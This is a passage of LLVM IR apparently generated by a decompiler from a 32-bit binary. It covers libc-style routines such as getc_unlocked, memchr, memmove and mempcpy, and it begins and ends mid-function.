  %v1_80524e4 = inttoptr i32 %v0_80524e4 to i32*
  store i32 112, i32* %v1_80524e4, align 4
  %v0_80524ea = load i32, i32* %esi.global-to-local, align 4
  %v1_80524ea = load i32, i32* @ecx, align 4
  %v2_80524ea = add i32 %v1_80524ea, 4
  %v3_80524ea = inttoptr i32 %v2_80524ea to i32*
  store i32 %v0_80524ea, i32* %v3_80524ea, align 4
  %v0_80524ed = load i32, i32* %eax.global-to-local, align 4
  %v1_80524ed = load i32, i32* @ecx, align 4
  %v2_80524ed = add i32 %v1_80524ed, 8
  %v3_80524ed = inttoptr i32 %v2_80524ed to i32*
  store i32 %v0_80524ed, i32* %v3_80524ed, align 4
  %v0_80524f0 = load i32, i32* @ecx, align 4
  %v1_80524f0 = add i32 %v0_80524f0, 12
  store i32 %v1_80524f0, i32* @ecx, align 4
  br label %dec_label_pc_80524f3

dec_label_pc_80524f3:                             ; preds = %dec_label_pc_805247d, %dec_label_pc_8052118, %dec_label_pc_80524d5
  %v0_8052574 = phi i32 [ %v1_805250084, %dec_label_pc_805247d ], [ %v2_8052120, %dec_label_pc_8052118 ], [ %v1_80524f0, %dec_label_pc_80524d5 ]
  %v2_80524f3 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_80524f3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80524f7

dec_label_pc_80524f7:                             ; preds = %dec_label_pc_80524f7, %dec_label_pc_80524f3
  %v0_80524f7 = phi i32 [ %v2_80524f3, %dec_label_pc_80524f3 ], [ %v1_80524f9, %dec_label_pc_80524f7 ]
  %stack_var_-216.0 = phi i32 [ %v3_805200b, %dec_label_pc_80524f3 ], [ %v5_80524fc, %dec_label_pc_80524f7 ]
  %v1_80524f7 = inttoptr i32 %v0_80524f7 to i32*
  %v2_80524f7 = load i32, i32* %v1_80524f7, align 4
  store i32 %v2_80524f7, i32* %edx.global-to-local, align 4
  %v1_80524f9 = add i32 %v0_80524f7, 12
  store i32 %v1_80524f9, i32* %eax.global-to-local, align 4
  %v5_80524fc = sub i32 %stack_var_-216.0, %v2_80524f7
  %v7_8052500 = icmp ult i32 %v1_80524f9, %v0_8052574
  br i1 %v7_8052500, label %dec_label_pc_80524f7, label %dec_label_pc_8052504

dec_label_pc_8052504:                             ; preds = %dec_label_pc_80524f7
  %v5_805250d = icmp eq i8 %stack_var_-26.0, 0
  %v1_805251d = icmp eq i1 %v5_805250d, false
  %v2_805251d = zext i1 %v1_805251d to i32
  %v2_8052520 = sub i32 %v5_80524fc, %v2_805251d
  store i32 %v2_8052520, i32* %edx.global-to-local, align 4
  store i32 160, i32* %stack_var_-168, align 4
  store i32 %v2_8052520, i32* %eax.global-to-local, align 4
  store i32 %v0_8052574, i32* %esi.global-to-local, align 4
  %tmp141 = icmp slt i32 %v2_8052520, 1
  br i1 %tmp141, label %dec_label_pc_8052576, label %dec_label_pc_8052536

dec_label_pc_8052536:                             ; preds = %dec_label_pc_8052504
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v2_805253d = inttoptr i32 %v1_805204b to i8*
  %v3_805253d = load i8, i8* %v2_805253d, align 1
  %v4_805253d = and i8 %v3_805253d, 8
  %v5_805253d = icmp eq i8 %v4_805253d, 0
  br i1 %v5_805253d, label %dec_label_pc_8052558, label %dec_label_pc_8052543

dec_label_pc_8052543:                             ; preds = %dec_label_pc_8052536
  %v1_8052543 = add i32 %v0_8052574, 12
  store i32 %v1_8052543, i32* %esi.global-to-local, align 4
  %v1_8052546 = inttoptr i32 %v0_8052574 to i32*
  store i32 160, i32* %v1_8052546, align 4
  %v0_805254c = load i32, i32* %eax.global-to-local, align 4
  %v1_805254c = load i32, i32* @ecx, align 4
  %v2_805254c = add i32 %v1_805254c, 4
  %v3_805254c = inttoptr i32 %v2_805254c to i32*
  store i32 %v0_805254c, i32* %v3_805254c, align 4
  %v0_805254f = load i32, i32* @ecx, align 4
  %v1_805254f = add i32 %v0_805254f, 8
  %v2_805254f = inttoptr i32 %v1_805254f to i32*
  store i32 ptrtoint (i32* @global_var_8057f93.276 to i32), i32* %v2_805254f, align 4
  br label %dec_label_pc_8052576

dec_label_pc_8052558:                             ; preds = %dec_label_pc_8052536
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_805255f = add i32 %tmp112, 16
  %v2_805255f = inttoptr i32 %v1_805255f to i32*
  %v3_805255f = load i32, i32* %v2_805255f, align 4
  %v9_805255f = icmp eq i32 %v3_805255f, 48
  %v1_8052563 = icmp eq i1 %v9_805255f, false
  br i1 %v1_8052563, label %dec_label_pc_8052570, label %dec_label_pc_8052565

dec_label_pc_8052565:                             ; preds = %dec_label_pc_8052558
  %v3_8052565 = load i32, i32* %stack_var_-152, align 4
  %v5_8052565 = add i32 %v3_8052565, %v2_8052520
  store i32 %v5_8052565, i32* %stack_var_-152, align 4
  br label %dec_label_pc_8052574

dec_label_pc_805256b:                             ; preds = %dec_label_pc_805257c
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80525a3

dec_label_pc_8052570:                             ; preds = %dec_label_pc_8052558
  br label %dec_label_pc_8052574

dec_label_pc_8052574:                             ; preds = %dec_label_pc_8052565, %dec_label_pc_8052570
  store i32 %v0_8052574, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052576

dec_label_pc_8052576:                             ; preds = %dec_label_pc_8052504, %dec_label_pc_8052543, %dec_label_pc_8052574
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_8052578 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_8052578, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805257c

dec_label_pc_805257c:                             ; preds = %dec_label_pc_805259a, %dec_label_pc_8052576
  call void @__pseudo_call(i32 %tmp112)
  %v0_8052595 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052595 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052595 = add i32 %v1_8052595, 4
  %v3_8052595 = inttoptr i32 %v2_8052595 to i32*
  %v4_8052595 = load i32, i32* %v3_8052595, align 4
  %v15_8052595 = icmp eq i32 %v0_8052595, %v4_8052595
  %v1_8052598 = icmp eq i1 %v15_8052595, false
  br i1 %v1_8052598, label %dec_label_pc_805256b, label %dec_label_pc_805259a

dec_label_pc_805259a:                             ; preds = %dec_label_pc_805257c
  %v1_805259a = add i32 %v1_8052595, 12
  store i32 %v1_805259a, i32* %ebx.global-to-local, align 4
  %v0_805259d = load i32, i32* %edi.global-to-local, align 4
  %v2_805259d = add i32 %v0_805259d, %v0_8052595
  store i32 %v2_805259d, i32* %edi.global-to-local, align 4
  %v1_805259f = load i32, i32* %esi.global-to-local, align 4
  %v7_805259f = icmp ult i32 %v1_805259a, %v1_805259f
  br i1 %v7_805259f, label %dec_label_pc_805257c, label %dec_label_pc_80525a3

dec_label_pc_80525a3:                             ; preds = %dec_label_pc_805259a, %dec_label_pc_805256b
  %v0_80525a9 = phi i32 [ -1, %dec_label_pc_805256b ], [ %v2_805259d, %dec_label_pc_805259a ]
  store i32 %v0_80525a9, i32* %eax.global-to-local, align 4
  %v2_80525ac = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80525ac, i32* @esi, align 4
  store i32 %v0_8051fee, i32* @edi, align 4
  store i32 %v0_8051fed, i32* @ebp, align 4
  ret i32 %v0_80525a9

; uselistorder directives
  uselistorder i32 %v0_80525a9, { 1, 0 }
  uselistorder i32 %v1_80524f9, { 1, 2, 0 }
  uselistorder i32 %v0_80524f7, { 1, 0 }
  uselistorder i32 %v0_8052574, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v0_80524ca, { 1, 0 }
  uselistorder i32 %v9_80524c1, { 1, 2, 3, 0 }
  uselistorder i32 %v0_80524b9, { 1, 0 }
  uselistorder i32 %v0_805248b, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8052464, { 1, 0 }
  uselistorder i32 %v1_8052464, { 1, 0, 2 }
  uselistorder i32 %v2_8052462, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_8052398, { 2, 1, 3, 0 }
  uselistorder i32 %v2_805237e, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_80523e3, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v0_8052349, { 0, 2, 1 }
  uselistorder i32 %v1_8052322, { 1, 0 }
  uselistorder i32 %v0_805231d, { 1, 2, 0, 3 }
  uselistorder i32 %v2_80522ea, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_80522e5, { 1, 0 }
  uselistorder i8 %v2_80522de, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_80522de, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8052268, { 1, 2, 0 }
  uselistorder i8 %stack_var_-206.1, { 3, 1, 4, 0, 2 }
  uselistorder i8 %v4_805224d, { 1, 0 }
  uselistorder i32 %v1_8052239, { 1, 0 }
  uselistorder i32 %v0_805222d, { 1, 0 }
  uselistorder i32 %v4_8052214, { 1, 0 }
  uselistorder i32 %tmp149, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_8052219, { 1, 0 }
  uselistorder i32 %v2_80521d7, { 1, 0, 2 }
  uselistorder i3 %v1_805208d, { 1, 0 }
  uselistorder i8 %v4_805210c, { 1, 0 }
  uselistorder i32 %v3_805204b, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_805204b, { 1, 0, 2 }
  uselistorder i8 %stack_var_-206.0, { 3, 2, 0, 4, 5, 1, 6, 7 }
  uselistorder i32 %v1_805201d, { 1, 0 }
  uselistorder i32 %v3_805200b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp112, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 0, 1, 2, 4, 3 }
  uselistorder x86_fp80* %st0.global-to-local, { 0, 2, 3, 1 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 5, 4, 6, 7, 1, 8, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7, 10, 9, 11, 8, 12, 13, 14, 15 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 5, 6, 9, 13, 12, 14, 10, 11, 15, 18, 16, 19, 17, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 5, 4, 6, 8, 7, 9 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 3, 5, 6, 4, 7, 8, 9, 10, 14, 11, 12, 0, 15, 16, 13, 20, 17, 18, 19, 21, 22, 23, 24 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 2, 7, 8, 3, 9, 6, 4, 10, 5, 11 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 4, 5, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i8 56, { 1, 0 }
  uselistorder i8 102, { 4, 1, 0, 3, 2 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8052576, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052574, { 1, 0 }
  uselistorder label %dec_label_pc_80524f3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80524a5, { 1, 0 }
  uselistorder label %dec_label_pc_805247d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805244c, { 1, 0 }
  uselistorder label %dec_label_pc_8052439, { 1, 0 }
  uselistorder label %dec_label_pc_805241f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80523ec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80523d7, { 1, 0 }
  uselistorder label %dec_label_pc_80523cc, { 1, 0 }
  uselistorder label %dec_label_pc_8052353, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052345, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805230b, { 1, 0 }
  uselistorder label %dec_label_pc_80522db.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_80522a7, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052276, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052261, { 1, 0 }
  uselistorder label %dec_label_pc_8052118, { 1, 0 }
  uselistorder label %dec_label_pc_805203c, { 1, 0 }
  uselistorder label %dec_label_pc_8052033, { 1, 0 }
}

define i32 @getc_unlocked() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16* @__decompiler_undefined_function_6()
  %stack_var_-5 = alloca i8, align 1
  %v0_80525b0 = load i32, i32* @ebx, align 4
  %v4_80525b4 = ptrtoint i16* %tmp to i32
  store i32 %v4_80525b4, i32* @ebx, align 4
  %v1_80525b8 = add i32 %v4_80525b4, 16
  %v2_80525b8 = inttoptr i32 %v1_80525b8 to i32*
  %v3_80525b8 = load i32, i32* %v2_80525b8, align 4
  %v2_80525bb = add i32 %v4_80525b4, 24
  %v3_80525bb = inttoptr i32 %v2_80525bb to i32*
  %v4_80525bb = load i32, i32* %v3_80525bb, align 4
  %v10_80525bb = icmp ult i32 %v3_80525b8, %v4_80525bb
  br i1 %v10_80525bb, label %dec_label_pc_805265d, label %dec_label_pc_80525c4

dec_label_pc_80525c4:                             ; preds = %entry
  %v2_80525c4 = load i16, i16* %tmp, align 2
  %v3_80525c4 = zext i16 %v2_80525c4 to i32
  %v1_80525c7 = and i32 %v3_80525c4, 131
  %v6_80525d1 = icmp ugt i32 %v1_80525c7, 128
  br i1 %v6_80525d1, label %dec_label_pc_80525eb, label %dec_label_pc_80525d3

dec_label_pc_80525d3:                             ; preds = %dec_label_pc_80525c4
  %v0_80525d3 = load i32, i32* @edx, align 4
  %v6_80525db = call i32 @__stdio_trans2r_o(i16* nonnull %tmp, i32 128, i32 %v0_80525d3, i32 %v0_80525d3)
  %v1_80525e3 = icmp eq i32 %v6_80525db, 0
  %v1_80525e5 = icmp eq i1 %v1_80525e3, false
  br i1 %v1_80525e5, label %dec_label_pc_8052682, label %dec_label_pc_80525d3.dec_label_pc_80525eb_crit_edge

dec_label_pc_80525d3.dec_label_pc_80525eb_crit_edge: ; preds = %dec_label_pc_80525d3
  %v0_80525eb.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80525eb

dec_label_pc_80525eb:                             ; preds = %dec_label_pc_80525d3.dec_label_pc_80525eb_crit_edge, %dec_label_pc_80525c4
  %v2_805261f = phi i32 [ %v0_80525eb.pre, %dec_label_pc_80525d3.dec_label_pc_80525eb_crit_edge ], [ %v4_80525b4, %dec_label_pc_80525c4 ]
  %v1_80525eb = inttoptr i32 %v2_805261f to i32*
  %v2_80525eb = load i32, i32* %v1_80525eb, align 4
  store i32 %v2_80525eb, i32* @ecx, align 4
  %v1_80525ed = urem i32 %v2_80525eb, 65536
  store i32 %v1_80525ed, i32* %edx.global-to-local, align 4
  %v2_80525f0 = and i32 %v2_80525eb, 2
  %v3_80525f0 = icmp eq i32 %v2_80525f0, 0
  br i1 %v3_80525f0, label %dec_label_pc_805260e, label %dec_label_pc_80525f5

dec_label_pc_80525f5:                             ; preds = %dec_label_pc_80525eb
  %v1_80525f5 = urem i32 %v2_80525eb, 2
  store i32 %v1_80525f5, i32* %edx.global-to-local, align 4
  %v1_80525f8 = add i32 %v2_80525eb, 65535
  %v1_80525fb = trunc i32 %v1_80525f8 to i16
  %v3_80525fb = inttoptr i32 %v2_805261f to i16*
  store i16 %v1_80525fb, i16* %v3_80525fb, align 2
  %v0_80525fe = load i32, i32* @ebx, align 4
  %v1_80525fe = load i32, i32* %edx.global-to-local, align 4
  %v2_80525fe = mul i32 %v1_80525fe, 4
  %v3_80525fe = add i32 %v0_80525fe, 36
  %v4_80525fe = add i32 %v3_80525fe, %v2_80525fe
  %v5_80525fe = inttoptr i32 %v4_80525fe to i8*
  %v6_80525fe = load i8, i8* %v5_80525fe, align 1
  %v7_80525fe = zext i8 %v6_80525fe to i32
  %v9_80525fe = and i32 %v1_80525fe, -256
  %v10_80525fe = or i32 %v7_80525fe, %v9_80525fe
  store i32 %v10_80525fe, i32* %edx.global-to-local, align 4
  %v1_8052602 = add i32 %v0_80525fe, 40
  %v2_8052602 = inttoptr i32 %v1_8052602 to i32*
  store i32 0, i32* %v2_8052602, align 4
  %v0_8052609 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052609 = urem i32 %v0_8052609, 256
  store i32 %v1_8052609, i32* @edx, align 4
  br label %dec_label_pc_8052685

dec_label_pc_805260e:                             ; preds = %dec_label_pc_80525eb
  %v1_805260e = add i32 %v2_805261f, 16
  %v2_805260e = inttoptr i32 %v1_805260e to i32*
  %v3_805260e = load i32, i32* %v2_805260e, align 4
  store i32 %v3_805260e, i32* @eax, align 4
  %v1_8052611 = add i32 %v2_805261f, 20
  %v2_8052611 = inttoptr i32 %v1_8052611 to i32*
  %v3_8052611 = load i32, i32* %v2_8052611, align 4
  %v15_8052611 = icmp eq i32 %v3_8052611, %v3_805260e
  %v1_8052614 = icmp eq i1 %v15_8052611, false
  br i1 %v1_8052614, label %dec_label_pc_805265d, label %dec_label_pc_8052616

dec_label_pc_8052616:                             ; preds = %dec_label_pc_805260e
  %v1_8052616 = add i32 %v2_805261f, 4
  %v2_8052616 = inttoptr i32 %v1_8052616 to i32*
  %v3_8052616 = load i32, i32* %v2_8052616, align 4
  %v13_8052616 = icmp eq i32 %v3_8052616, -2
  %v1_805261a = icmp eq i1 %v13_8052616, false
  br i1 %v1_805261a, label %dec_label_pc_8052624, label %dec_label_pc_805261c

dec_label_pc_805261c:                             ; preds = %dec_label_pc_8052616
  %v1_805261c = or i32 %v2_80525eb, 4
  store i32 %v1_805261c, i32* @ecx, align 4
  %v1_805261f = trunc i32 %v1_805261c to i16
  %v3_805261f = inttoptr i32 %v2_805261f to i16*
  store i16 %v1_805261f, i16* %v3_805261f, align 2
  br label %dec_label_pc_8052682

dec_label_pc_8052624:                             ; preds = %dec_label_pc_8052616
  %v1_8052624 = udiv i32 %v2_80525eb, 256
  %v2_8052624 = trunc i32 %v1_8052624 to i8
  %v3_8052624 = urem i8 %v2_8052624, 4
  %v4_8052624 = icmp eq i8 %v3_8052624, 0
  %v8_8052624 = zext i8 %v3_8052624 to i32
  %v10_8052624 = mul nuw nsw i32 %v8_8052624, 256
  %v11_8052624 = urem i32 %v2_80525eb, 256
  %v12_8052624 = or i32 %v10_8052624, %v11_8052624
  store i32 %v12_8052624, i32* %edx.global-to-local, align 4
  br i1 %v4_8052624, label %dec_label_pc_8052639, label %dec_label_pc_8052629

dec_label_pc_8052629:                             ; preds = %dec_label_pc_8052624
  %v3_8052631 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_8059ed8.200 to i16*))
  %v0_8052639.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8052639

dec_label_pc_8052639:                             ; preds = %dec_label_pc_8052624, %dec_label_pc_8052629
  %v0_805266e = phi i32 [ %v2_805261f, %dec_label_pc_8052624 ], [ %v0_8052639.pre, %dec_label_pc_8052629 ]
  %v1_8052639 = add i32 %v0_805266e, 8
  %v2_8052639 = inttoptr i32 %v1_8052639 to i32*
  %v3_8052639 = load i32, i32* %v2_8052639, align 4
  %v1_805263c = add i32 %v0_805266e, 12
  %v2_805263c = inttoptr i32 %v1_805263c to i32*
  %v3_805263c = load i32, i32* %v2_805263c, align 4
  %v15_805263c = icmp eq i32 %v3_805263c, %v3_8052639
  br i1 %v15_805263c, label %dec_label_pc_8052666, label %dec_label_pc_8052641

dec_label_pc_8052641:                             ; preds = %dec_label_pc_8052639
  %v2_8052644 = add i32 %v0_805266e, 24
  %v3_8052644 = inttoptr i32 %v2_8052644 to i32*
  store i32 %v3_8052639, i32* %v3_8052644, align 4
  %v0_8052647 = load i32, i32* @ebx, align 4
  %v2_8052648 = call i32 @__stdio_rfill(i32 %v0_8052647)
  %v1_8052650 = icmp eq i32 %v2_8052648, 0
  br i1 %v1_8052650, label %dec_label_pc_8052682, label %dec_label_pc_8052654

dec_label_pc_8052654:                             ; preds = %dec_label_pc_8052641
  %v0_8052654 = load i32, i32* @ebx, align 4
  %v1_8052654 = add i32 %v0_8052654, 20
  %v2_8052654 = inttoptr i32 %v1_8052654 to i32*
  %v3_8052654 = load i32, i32* %v2_8052654, align 4
  %v2_8052657 = add i32 %v0_8052654, 24
  %v3_8052657 = inttoptr i32 %v2_8052657 to i32*
  store i32 %v3_8052654, i32* %v3_8052657, align 4
  %v0_805265a = load i32, i32* @ebx, align 4
  %v1_805265a = add i32 %v0_805265a, 16
  %v2_805265a = inttoptr i32 %v1_805265a to i32*
  %v3_805265a = load i32, i32* %v2_805265a, align 4
  br label %dec_label_pc_805265d

dec_label_pc_805265d:                             ; preds = %dec_label_pc_805260e, %entry, %dec_label_pc_8052654
  %v1_8052661 = phi i32 [ %v2_805261f, %dec_label_pc_805260e ], [ %v4_80525b4, %entry ], [ %v0_805265a, %dec_label_pc_8052654 ]
  %v0_805265d = phi i32 [ %v3_805260e, %dec_label_pc_805260e ], [ %v3_80525b8, %entry ], [ %v3_805265a, %dec_label_pc_8052654 ]
  %v1_805265d = inttoptr i32 %v0_805265d to i8*
  %v2_805265d = load i8, i8* %v1_805265d, align 1
  %v3_805265d = zext i8 %v2_805265d to i32
  store i32 %v3_805265d, i32* @edx, align 4
  %v1_8052660 = add i32 %v0_805265d, 1
  %v2_8052661 = add i32 %v1_8052661, 16
  %v3_8052661 = inttoptr i32 %v2_8052661 to i32*
  store i32 %v1_8052660, i32* %v3_8052661, align 4
  %v0_8052685.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052685

dec_label_pc_8052666:                             ; preds = %dec_label_pc_8052639
  %v2_8052669 = ptrtoint i8* %stack_var_-5 to i32
  %v5_805266e = inttoptr i32 %v0_805266e to i16*
  %v5_805266f = call i32 @__stdio_READ(i16* %v5_805266e, i32 %v2_8052669, i32 1)
  %v1_8052677 = icmp eq i32 %v5_805266f, 0
  br i1 %v1_8052677, label %dec_label_pc_8052682, label %dec_label_pc_805267b

dec_label_pc_805267b:                             ; preds = %dec_label_pc_8052666
  %v3_805267b = load i8, i8* %stack_var_-5, align 1
  %v4_805267b = sext i8 %v3_805267b to i32
  store i32 %v4_805267b, i32* @edx, align 4
  br label %dec_label_pc_8052685

dec_label_pc_8052682:                             ; preds = %dec_label_pc_8052666, %dec_label_pc_8052641, %dec_label_pc_80525d3, %dec_label_pc_805261c
  store i32 -1, i32* @edx, align 4
  br label %dec_label_pc_8052685

dec_label_pc_8052685:                             ; preds = %dec_label_pc_805267b, %dec_label_pc_805265d, %dec_label_pc_80525f5, %dec_label_pc_8052682
  %v0_8052685 = phi i32 [ %v4_805267b, %dec_label_pc_805267b ], [ %v0_8052685.pre, %dec_label_pc_805265d ], [ %v1_8052609, %dec_label_pc_80525f5 ], [ -1, %dec_label_pc_8052682 ]
  store i32 %v0_80525b0, i32* @ebx, align 4
  ret i32 %v0_8052685

; uselistorder directives
  uselistorder i32 %v0_805265d, { 1, 0 }
  uselistorder i32 %v3_8052639, { 1, 0 }
  uselistorder i32 %v0_805266e, { 0, 1, 3, 2 }
  uselistorder i8 %v3_8052624, { 1, 0 }
  uselistorder i32 %v3_805260e, { 1, 0, 2 }
  uselistorder i32 %v1_8052609, { 1, 0 }
  uselistorder i32 %v2_80525eb, { 1, 0, 4, 5, 2, 6, 3, 7 }
  uselistorder i32 %v2_805261f, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i32 (i16*)* @fflush_unlocked, { 1, 0 }
  uselistorder i32 131, { 1, 0 }
  uselistorder label %dec_label_pc_8052685, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8052682, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_805265d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052639, { 1, 0 }
}

define i32 @__GI_memchr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_805268c = load i32, i32* @edi, align 4
  store i32 %v0_805268c, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_8052693 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052693, i32* %edi.global-to-local, align 4
  %v1_805269b = icmp eq i32 %arg3, 0
  store i1 %v1_805269b, i1* %zf.global-to-local, align 1
  br i1 %v1_805269b, label %dec_label_pc_80526ab, label %dec_label_pc_805269f

dec_label_pc_805269f:                             ; preds = %entry
  %v2_805269f = call i32 @_strlen(i8* %arg1)
  %v3_805269f = mul i32 %v2_805269f, -1
  %v4_805269f = add i32 %v3_805269f, -2
  store i32 %v4_805269f, i32* @ecx, align 4
  %v0_80526a1 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_80526a1, label %dec_label_pc_805269f.dec_label_pc_80526a8_crit_edge, label %dec_label_pc_80526a3

dec_label_pc_805269f.dec_label_pc_80526a8_crit_edge: ; preds = %dec_label_pc_805269f
  %v0_80526a8.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_80526a8.pre, -1
  br label %dec_label_pc_80526a8

dec_label_pc_80526a3:                             ; preds = %dec_label_pc_805269f
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80526a8

dec_label_pc_80526a8:                             ; preds = %dec_label_pc_805269f.dec_label_pc_80526a8_crit_edge, %dec_label_pc_80526a3
  %v0_80526a8 = phi i32 [ %phitmp, %dec_label_pc_805269f.dec_label_pc_80526a8_crit_edge ], [ 0, %dec_label_pc_80526a3 ]
  %v8_80526a8 = icmp eq i32 %v0_80526a8, 0
  store i1 %v8_80526a8, i1* %zf.global-to-local, align 1
  store i32 %v0_80526a8, i32* %edi.global-to-local, align 4
  %v2_80526ad.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80526ab

dec_label_pc_80526ab:                             ; preds = %entry, %dec_label_pc_80526a8
  %v2_80526ad = phi i32 [ %v0_805268c, %entry ], [ %v2_80526ad.pre, %dec_label_pc_80526a8 ]
  %v0_80526ab = phi i32 [ 0, %entry ], [ %v0_80526a8, %dec_label_pc_80526a8 ]
  store i32 %v2_80526ad, i32* @edi, align 4
  ret i32 %v0_80526ab

; uselistorder directives
  uselistorder i32 %v0_80526a8, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_80526ab, { 1, 0 }
  uselistorder label %dec_label_pc_80526a8, { 1, 0 }
}

define i32 @memmove(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_80526b1 = load i32, i32* @esi, align 4
  store i32 %v0_80526b1, i32* %stack_var_-8, align 4
  %v4_80526b2 = ptrtoint i8* %arg1 to i32
  %v9_80526be = icmp ugt i8* %tmp3, %arg1
  %v1_80526c0 = icmp eq i1 %v9_80526be, false
  br i1 %v1_80526c0, label %dec_label_pc_80526c8, label %dec_label_pc_80526c2

dec_label_pc_80526c2:                             ; preds = %entry
  %v7_80526c4 = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %tmp)
  br label %dec_label_pc_80526d4

dec_label_pc_80526c8:                             ; preds = %entry
  %v3_80526c8 = add i32 %arg2, -1
  %v4_80526c8 = add i32 %v3_80526c8, %tmp
  %v5_80526c8 = inttoptr i32 %v4_80526c8 to i8*
  %v3_80526cc = add i32 %v4_80526b2, -1
  %v4_80526cc = add i32 %v3_80526cc, %tmp
  %v5_80526cc = inttoptr i32 %v4_80526cc to i8*
  %v7_80526d1 = call i8* @_memcpy(i8* %v5_80526cc, i8* %v5_80526c8, i32 %tmp)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_80526d4

dec_label_pc_80526d4:                             ; preds = %dec_label_pc_80526c2, %dec_label_pc_80526c8
  %v2_80526d4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80526d4, i32* @esi, align 4
  ret i32 %v4_80526b2

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %tmp, { 1, 3, 2, 0 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80526d4, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_80526d8 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_80526eb = inttoptr i32 %arg1 to i16*
  %v4_80526eb = call i32 @memcpy(i16* %v3_80526eb, i32 %arg2, i32 %arg3)
  %v0_80526f0 = load i32, i32* @esi, align 4
  %v2_80526f0 = add i32 %v0_80526f0, %arg3
  store i32 %v0_80526d8, i32* @esi, align 4
  ret i32 %v2_80526f0
}

define i32 @memrchr(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg2 to i8
  %v4_8052701 = urem i32 %arg2, 256
  %v4_805270d = sext i8 %arg1 to i32
